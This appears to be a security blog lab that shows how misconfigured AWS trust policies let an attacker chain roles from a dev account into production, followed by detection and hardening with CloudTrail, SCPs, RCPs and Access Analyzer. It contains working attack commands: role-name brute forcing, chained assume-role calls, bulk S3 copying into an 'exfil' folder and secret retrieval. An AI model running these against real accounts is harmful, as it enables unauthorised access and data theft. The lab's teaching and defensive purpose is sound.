---
layout: post
title: "Lab — Cross-Account Role Chaining: One Compromised Account to Full Org Access"
date: 2026-07-02T10:00:00
categories:
  - AWS Security Labs
  - IAM lab
tags:
  - aws
  - cross-account
  - role-chaining
  - organizations
  - scp
  - access-analyzer
  - guardduty
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab demonstrating how a single compromised AWS account becomes a pivot point into an entire organization — using misconfigured trust policies, resource-based policy wildcards, and role chaining to move laterally across accounts — then stopped with SCPs, RCPs, and Access Analyzer.
toc: true
pin: false
math: false
mermaid: false
image:
---

## Objective

Compromise one low-privilege AWS account.
Use misconfigured role trust policies to chain through multiple accounts.
Reach the production account without ever touching the management account.
Detect the lateral movement with CloudTrail and GuardDuty.
Stop it with SCPs and resource control policies.

**Run this only in AWS accounts you own.**
This lab works best with an AWS Organization — you can simulate it with two accounts minimum.

---

## Why Cross-Account Attacks Are the Endgame

Every lab so far has been within a single AWS account.
In real organizations, accounts are segmented by environment, team, or function — dev, staging, prod, security, shared-services.
The assumption is that a compromised dev account cannot reach prod.

That assumption is wrong when:
- A prod role trusts the entire account, not a specific role
- A resource (S3, KMS, Lambda) has a wildcard principal in its policy
- A shared-services role can be assumed from any account in the org
- An IAM role has no ExternalId requirement and is assumed via confused deputy

This lab demonstrates how one credential in a dev account becomes full production access through a chain of misconfigured trust policies.

---

## Attack Chain Overview

```
Account A (dev) — attacker starts here with stolen credentials
    │
    │  Step 1: Find roles that trust Account A broadly (not specific roles)
    ▼
Account B (shared-services) — pivot via misconfigured trust
    │
    │  Step 2: From shared-services, find roles in prod that trust shared-services
    ▼
Account C (production) — lateral movement complete
    │
    │  Step 3: Enumerate production resources, exfiltrate data
    │  Step 4: Find if any resource policy uses Principal: * or trusts the org broadly
    ▼
Full production data access
```

---

## Lab Setup — Three-Account Organization

### Accounts

| Account | Alias | Purpose |
|---------|-------|---------|
| 111111111111 | lab-dev | Development — attacker starts here |
| 222222222222 | lab-shared | Shared services — pivot point |
| 333333333333 | lab-prod | Production — target |

If you only have two accounts, use one as dev+shared and one as prod.

### Step 0.1 — Set Up IAM Roles

**In Account B (shared-services) — the misconfigured pivot role:**

```bash
# Run this in Account B
cat > shared-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::111111111111:root"
    },
    "Action": "sts:AssumeRole"
  }]
}
EOF
# MISCONFIGURATION: trusts the ENTIRE Account A (the :root notation)
# Should trust only a specific role ARN, not :root

aws iam create-role \
  --role-name shared-services-role \
  --assume-role-policy-document file://shared-trust.json \
  --profile account-b

aws iam attach-role-policy \
  --role-name shared-services-role \
  --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess \
  --profile account-b

# Also give it ability to assume roles in other accounts
aws iam put-role-policy \
  --role-name shared-services-role \
  --policy-name cross-account-assume \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "sts:AssumeRole",
      "Resource": "arn:aws:iam::333333333333:role/prod-access-role"
    }]
  }' \
  --profile account-b
```

**In Account C (production) — the final target role:**

```bash
# Run this in Account C
cat > prod-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::222222222222:root"
    },
    "Action": "sts:AssumeRole"
  }]
}
EOF
# MISCONFIGURATION: trusts entire Account B, not a specific role

aws iam create-role \
  --role-name prod-access-role \
  --assume-role-policy-document file://prod-trust.json \
  --profile account-c

aws iam attach-role-policy \
  --role-name prod-access-role \
  --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess \
  --profile account-c

aws iam attach-role-policy \
  --role-name prod-access-role \
  --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess \
  --profile account-c
```

**In Account A (dev) — the attacker's starting credentials:**

```bash
# Attacker has a low-privilege IAM user in Account A
aws iam create-user --user-name compromised-developer --profile account-a

aws iam put-user-policy \
  --user-name compromised-developer \
  --policy-name dev-permissions \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {"Effect": "Allow", "Action": "s3:*", "Resource": "arn:aws:s3:::dev-bucket/*"},
      {"Effect": "Allow", "Action": "sts:AssumeRole", "Resource": "*"}
    ]
  }' \
  --profile account-a

aws iam create-access-key \
  --user-name compromised-developer \
  --profile account-a
# Use these as the attacker's credentials
```

> 📸 **SCREENSHOT:** Three AWS accounts visible in the AWS Organizations console, with the roles created in each account

---

## Phase 1 — Enumerate from Account A

Starting with the stolen `compromised-developer` credentials in Account A:

```bash
aws configure --profile attacker
# Enter compromised-developer's keys

# Confirm starting identity
aws sts get-caller-identity --profile attacker
# Account: 111111111111, User: compromised-developer

# The attacker knows this is a dev account — look for cross-account roles
# Real attackers use pacu's iam__enum_roles or targeted enumeration
```

### Enumerate Accessible Roles in Other Accounts

```bash
# Try to list roles in Account B — will fail (no iam:ListRoles)
aws iam list-roles --profile attacker
# AccessDenied — but we don't need to list them

# Brute-force common role names in other accounts using sts:AssumeRole
# (common in pentests — try known role names)
for ROLE in "shared-services-role" "cross-account-role" "OrganizationAccountAccessRole" "deployment-role" "admin-role"; do
  aws sts assume-role \
    --role-arn "arn:aws:iam::222222222222:role/$ROLE" \
    --role-session-name test \
    --profile attacker 2>/dev/null && echo "FOUND: $ROLE"
done
```

Output:

```
FOUND: shared-services-role
```

The role exists and its trust policy allows Account A's root — so any identity in Account A can assume it.

> 📸 **SCREENSHOT:** The loop output showing `FOUND: shared-services-role` — confirming the pivot role is accessible

---

## Phase 2 — Pivot to Account B (Shared Services)

```bash
# Assume the shared-services role
SHARED_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::222222222222:role/shared-services-role" \
  --role-session-name attacker-pivot \
  --profile attacker)

export AWS_ACCESS_KEY_ID=$(echo $SHARED_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $SHARED_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo $SHARED_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")

# Confirm new identity
aws sts get-caller-identity
# Account: 222222222222, Role: shared-services-role
```

Now in Account B — enumerate what is visible:

```bash
# Read-only access — see what prod resources are reachable
aws s3 ls                  # Lists buckets in Account B
aws ec2 describe-instances # Lists EC2 instances in Account B
aws iam list-roles         # Lists all roles in Account B — find further pivot targets

# Look for roles that can assume into Account C
aws iam list-roles | python3 -m json.tool | grep -A5 "333333333333"
```

> 📸 **SCREENSHOT:** `aws sts get-caller-identity` showing Account B, and `aws iam list-roles` showing prod-access-role is assumable

---

## Phase 3 — Pivot to Account C (Production)

```bash
# Chain the assumption — from Account B, assume the prod role in Account C
PROD_CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::333333333333:role/prod-access-role" \
  --role-session-name attacker-prod-pivot)

export AWS_ACCESS_KEY_ID=$(echo $PROD_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $PROD_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo $PROD_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")

aws sts get-caller-identity
# Account: 333333333333, Role: prod-access-role
```

The attacker started in Account A with dev credentials.
They are now operating in Account C (production) with no alerts from Account C's team — because the assume-role calls look like normal infrastructure automation.

```bash
# Enumerate production resources
aws s3 ls
aws ec2 describe-instances
aws rds describe-db-instances
aws secretsmanager list-secrets
aws iam list-users

# Extract production data
aws s3 sync s3://production-data-bucket ./exfil/
aws secretsmanager get-secret-value --secret-id prod/db/password
```

> 📸 **SCREENSHOT:** `aws sts get-caller-identity` showing Account C (production), and `aws s3 ls` listing production buckets

**GuardDuty findings in Account C:**

```
UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B
Discovery:IAMUser/AnomalousBehavior
```

The prod-access-role is being used from unusual IPs and making unusual API calls — GuardDuty fires on the behavior pattern.

---

## Phase 4 — Resource-Based Policy Wildcards

Independent of role chaining, some resources have policies that grant access to any principal — including principals in other accounts.

### Find Resources with Wildcard Principals

```bash
# Check S3 buckets for wildcard principals
aws s3api get-bucket-policy --bucket production-data-bucket | \
  python3 -m json.tool | grep '"Principal"'
```

If you find:

```json
"Principal": "*"
```

or:

```json
"Principal": {
  "AWS": "arn:aws:iam::*:root"
}
```

Any AWS account can access this resource — no role assumption needed.

### Other Resources to Check

```bash
# KMS key policies
aws kms list-keys --query 'Keys[*].KeyId' --output text | \
  xargs -n1 aws kms get-key-policy --policy-name default --key-id

# Lambda function policies
aws lambda list-functions --query 'Functions[*].FunctionName' --output text | \
  xargs -n1 aws lambda get-policy --function-name 2>/dev/null

# SNS topic policies
aws sns list-topics --query 'Topics[*].TopicArn' --output text | \
  xargs -n1 aws sns get-topic-attributes --topic-arn | grep Policy

# SQS queue policies
aws sqs list-queues --query 'QueueUrls[]' --output text | \
  xargs -n1 aws sqs get-queue-attributes --attribute-names Policy --queue-url
```

Use Access Analyzer to automate this — it finds all external access paths across every resource type:

```bash
# Create an analyzer for the entire org
aws accessanalyzer create-analyzer \
  --analyzer-name org-external-access \
  --type ORGANIZATION \
  --profile management-account

# List all findings — every resource reachable from outside the org or account
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:accessanalyzer:eu-west-1:MGMT_ACCOUNT_ID:analyzer/org-external-access
```

> 📸 **SCREENSHOT:** Access Analyzer findings showing resources with external access, including the misconfigured role trust policies

---

## Phase 5 — OrganizationAccountAccessRole Abuse

Every account in an AWS Organization created via Organizations console has a role called `OrganizationAccountAccessRole`.
Its trust policy allows the management account to assume it — this is how AWS lets the management account access member accounts.

```bash
# If the attacker compromises the management account,
# they can assume into EVERY other account in the org
aws sts assume-role \
  --role-arn "arn:aws:iam::ANY_ACCOUNT_ID:role/OrganizationAccountAccessRole" \
  --role-session-name org-takeover \
  --profile management-account

# This gives AdministratorAccess in the target account — every account in the org
```

This is why:
- The management account should have zero workloads
- MFA should be required for all management account access
- CloudTrail should be centralized and immutable
- The delegated admin pattern should be used instead of management account access

---

## Hardening — Four Layers That Stop This

### Fix 1 — Specific Role ARNs in Trust Policies (Not `:root`)

```bash
# WRONG — trusts any identity in Account A
{
  "Principal": {"AWS": "arn:aws:iam::111111111111:root"}
}

# RIGHT — trusts only a specific role in Account A
{
  "Principal": {"AWS": "arn:aws:iam::111111111111:role/specific-automation-role"}
}
```

Update all cross-account trust policies to reference specific role ARNs.

```bash
# Fix the shared-services role trust policy
aws iam update-assume-role-policy \
  --role-name shared-services-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::111111111111:role/specific-automation-role"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "Bool": {"aws:MultiFactorAuthPresent": "true"}
      }
    }]
  }' \
  --profile account-b
```

### Fix 2 — SCP to Restrict Who Can Assume Roles

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "RestrictCrossAccountAssumeRole",
    "Effect": "Deny",
    "Action": "sts:AssumeRole",
    "Resource": "*",
    "Condition": {
      "ArnNotLike": {
        "aws:PrincipalArn": [
          "arn:aws:iam::*:role/approved-automation-role",
          "arn:aws:iam::*:role/OrganizationAccountAccessRole"
        ]
      }
    }
  }]
}
```

Attach to all OUs except the management account — prevents any ad-hoc cross-account role assumptions.

### Fix 3 — RCP to Restrict Who Can Access Resources

Resource Control Policies (RCPs) are like SCPs but applied to resources instead of principals.
They restrict what any principal — even external ones — can do with resources in your org.

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "DenyExternalPrincipals",
    "Effect": "Deny",
    "Principal": "*",
    "Action": "s3:*",
    "Resource": "*",
    "Condition": {
      "StringNotEqualsIfExists": {
        "aws:PrincipalOrgID": "o-YOUR_ORG_ID"
      },
      "BoolIfExists": {
        "aws:PrincipalIsAWSService": "false"
      }
    }
  }]
}
```

This prevents any principal outside your organization from accessing S3 buckets — regardless of the bucket policy.

```bash
# Apply the RCP to the root of your organization
aws organizations create-policy \
  --name DenyExternalS3Access \
  --type RESOURCE_CONTROL_POLICY \
  --content file://s3-rcp.json \
  --description "Deny S3 access from principals outside the org"

aws organizations attach-policy \
  --policy-id p-RCP_ID \
  --target-id r-ROOT_ID
```

### Fix 4 — CloudTrail Cross-Account Visibility

Set up centralized CloudTrail in an immutable logging account:

```bash
# In the security/logging account
aws s3 mb s3://org-cloudtrail-logs-SECURITY_ACCOUNT --region eu-west-1

# Create org-wide trail
aws cloudtrail create-trail \
  --name org-trail \
  --s3-bucket-name org-cloudtrail-logs-SECURITY_ACCOUNT \
  --is-organization-trail \
  --is-multi-region-trail \
  --enable-log-file-validation

aws cloudtrail start-logging --name org-trail
```

Now query the cross-account role chaining in CloudTrail:

```bash
# Find all AssumeRole events across the org
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time 2026-07-02T00:00:00Z | \
  python3 -m json.tool | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
for e in data['Events']:
  detail = json.loads(e.get('CloudTrailEvent', '{}'))
  principal = detail.get('userIdentity', {}).get('arn', 'unknown')
  role = detail.get('requestParameters', {}).get('roleArn', 'unknown')
  source_ip = detail.get('sourceIPAddress', 'unknown')
  print(f'{principal} → {role} from {source_ip}')
"
```

This shows the full chain:
```
compromised-developer (Account A) → shared-services-role (Account B) from 1.2.3.4
shared-services-role (Account B) → prod-access-role (Account C) from 1.2.3.4
```

The same IP appearing across three accounts over a short window is the signature of role chaining.

> 📸 **SCREENSHOT:** CloudTrail query output showing the three AssumeRole events from the same IP across three accounts

---

## Access Analyzer — Detect Before Exploitation

Access Analyzer scans all trust policies and resource policies in the org and flags any that grant access to external principals.

```bash
# List all findings after creating the org analyzer
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:accessanalyzer:eu-west-1:MGMT_ID:analyzer/org-external-access \
  --output table

# Each finding shows:
# - Which resource has external access
# - Which external principal can access it
# - What actions they can perform
```

Expected findings for this lab:

| Resource | External access | Finding type |
|----------|----------------|--------------|
| `shared-services-role` trust | Account A (`:root`) | ExternalAccess — role can be assumed from another account |
| `prod-access-role` trust | Account B (`:root`) | ExternalAccess — role can be assumed from Account B |

> 📸 **SCREENSHOT:** Access Analyzer showing two external access findings for the cross-account roles with their trust policies

---

## The Mental Model — Every Account Is a Blast Radius

```
Without cross-account protections:
    One compromised account
        → can assume roles in other accounts
            → can access data in those accounts
                → can assume roles in MORE accounts
                    → full org compromise possible

With SCPs + RCPs + specific trust policies + Access Analyzer:
    One compromised account
        → cannot assume roles outside its OU
        → resources in other accounts deny external principals
        → Access Analyzer alerts immediately when a new external trust is created
        → blast radius is contained to the single account
```

---

## Cleanup

```bash
# Account B
aws iam delete-role-policy --role-name shared-services-role --policy-name cross-account-assume --profile account-b
aws iam detach-role-policy --role-name shared-services-role --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess --profile account-b
aws iam delete-role --role-name shared-services-role --profile account-b

# Account C
aws iam detach-role-policy --role-name prod-access-role --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess --profile account-c
aws iam detach-role-policy --role-name prod-access-role --policy-arn arn:aws:iam::aws:policy/IAMReadOnlyAccess --profile account-c
aws iam delete-role --role-name prod-access-role --profile account-c

# Account A
aws iam delete-user-policy --user-name compromised-developer --policy-name dev-permissions --profile account-a
aws iam delete-access-key --user-name compromised-developer --access-key-id AKID --profile account-a
aws iam delete-user --user-name compromised-developer --profile account-a

# Access Analyzer
aws accessanalyzer delete-analyzer --analyzer-name org-external-access --profile management-account
```

---

## Key Takeaways

- `arn:aws:iam::ACCOUNT_ID:root` in a trust policy means any identity in that account can assume the role — it is not just the root user; this is the most common cross-account misconfiguration
- Role chaining leaves a clear trail in CloudTrail — the same source IP assuming roles across multiple accounts over a short time window is a reliable detection signal
- SCPs restrict what accounts can DO — an SCP on the dev OU that blocks `sts:AssumeRole` to prod account ARNs stops lateral movement at the source
- RCPs restrict what can be DONE TO your resources — an RCP requiring org membership means external principals cannot access your data even if a resource policy says otherwise
- Access Analyzer at the org level surfaces every external trust path — run it continuously and treat any new external finding as a high-priority alert

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
